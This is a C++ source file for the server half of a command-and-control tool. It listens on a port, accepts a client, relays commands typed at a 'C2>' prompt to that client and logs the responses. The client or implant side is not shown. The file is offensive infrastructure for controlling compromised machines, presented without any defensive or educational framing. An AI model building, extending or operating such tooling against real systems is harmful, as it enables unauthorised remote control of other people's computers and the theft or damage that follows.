#include "C2Server.h"
#include "Logger.h"
#include <iostream>

C2Server::C2Server(std::unique_ptr<ISocket> s) : socket(std::move(s)) {}
    
        void C2Server::run() {
            try {
                socket->bindSocket(PORT);
                socket->listenToSocket();
                Logger::Instance().Log(LogLevel::INFO, "[*] Listening on port " + PORT);
    
                int clientSocket;
                while(true){
                    try{
                        clientSocket = socket->acceptConnection();
                        Logger::Instance().Log(LogLevel::INFO, "[+] Client connected");
                    } catch(const std::exception &e){
                        Logger::Instance().Log(LogLevel::ERROR, "Accept failed: " + std::string(e.what()));
                        continue;
                    }
                    while (true) {
                        std::cout << "C2> ";
                        std::string cmd;
                        if (!std::getline(std::cin, cmd)){
                            Logger::Instance().Log(LogLevel::WARN, "Server input interrupted. closing current connection");
                            break;
                        }
                        if (cmd.empty()) continue;
                        try{
                            socket->sendToClient(clientSocket, cmd);
                        } catch (const std::exception &e){
                            Logger::Instance().Log(LogLevel::ERROR, "Failed to send to client: " + std::string(e.what()));
                            break; //Drop the connection with the current client
                        }
                        
                        
                        try {
                            std::string response = socket->receiveFromClient(clientSocket);
                            Logger::Instance().Log(LogLevel::RESP, response);
                        } catch (const std::exception& e) {
                            Logger::Instance().Log(LogLevel::ERROR, "Error occured");
                            Logger::Instance().Log(LogLevel::ERROR, e.what());
                            break; //Drop the connection with the current client
                        }
                    }
                    close(clientSocket);
                    Logger::Instance().Log(LogLevel::INFO, "[*] Closed connection to client");
                }
            } catch (const std::exception& e) {
                    Logger::Instance().Log(LogLevel::ERROR, std::string(e.what()));
                }
                socket->closeConnection();
            }    
        